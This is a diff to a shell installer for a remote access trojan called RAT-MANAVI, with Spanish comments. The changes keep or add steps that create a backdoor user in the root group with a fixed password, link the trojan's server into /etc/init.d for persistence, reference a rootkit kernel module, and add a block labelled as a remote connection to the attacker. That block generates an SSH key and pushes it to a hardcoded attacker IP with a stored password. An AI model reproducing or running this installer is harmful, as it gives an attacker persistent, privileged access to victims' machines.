@@ -3,6 +3,9 @@
 RAT_DIR=$HOME/.rat/manavi/
 LOG_FILE=$RAT_DIR/rat.log
 
+CLIENT_PASS='hola123,'
+CLIENT_IP='192.168.222.9'
+
 MODPROBE=/sbin/modprobe
 INSMOD=/sbin/insmod
 USERADD=/usr/sbin/useradd
@@ -51,8 +54,14 @@ cd $RAT_DIR
 echo "root $$" > /proc/buddyinfo 2>/dev/null
 
 #Crear el usuario con el desde el cual se obtendrán los archivos
-$USERADD $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
-echo manavi:manavi | $CHPASSWD
+id -u $RAT_USER 1>&/dev/null
+if [ ! $? ]
+then
+	$USERADD $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
+	echo manavi:manavi | $CHPASSWD
+else
+	echo "Ya existe el usuario ${RAT_USER}"
+fi
 
 #Se instalan todas las dependencias
 apt-get -y install imagemagick 1>/dev/null
@@ -84,12 +93,26 @@ else
 fi
 
 #Agregar a init.d script server
-ln -s ${RAT_DIR}RAT-MANAVI/server.py /etc/init.d/
+if [ ! -f /etc/init.d/server.py ]
+then
+	ln -s ${RAT_DIR}RAT-MANAVI/server.py /etc/init.d/
+else
+	echo 'Ya existe la liga.'
+fi
 
 #Intalar modulo de rootkit
 #cd ${RAT_DIR}RAT-MANAVI/rootkit/
-#cd ${RAT_DIR}RAT-MANAVI/
+cd ${RAT_DIR}RAT-MANAVI/
 #$INSMOD rootkit.ko
+
+#Crear conexión remota con el atacante
+if [ ! -f $HOME/.ssh/id_rsa ]
+then
+	ssh-keygen -q -b 4096 -t rsa -N '' -f $HOME/.ssh/id_rsa
+	sshpass -p ${CLIENT_PASS} ssh-copy-id ${RAT_USER}@${CLIENT_IP}
+else
+	echo 'Ya os podeis conectar sin contraseña.'
+fi
 
 #Ejecutar el server.py
 cd ${RAT_DIR}RAT-MANAVI/
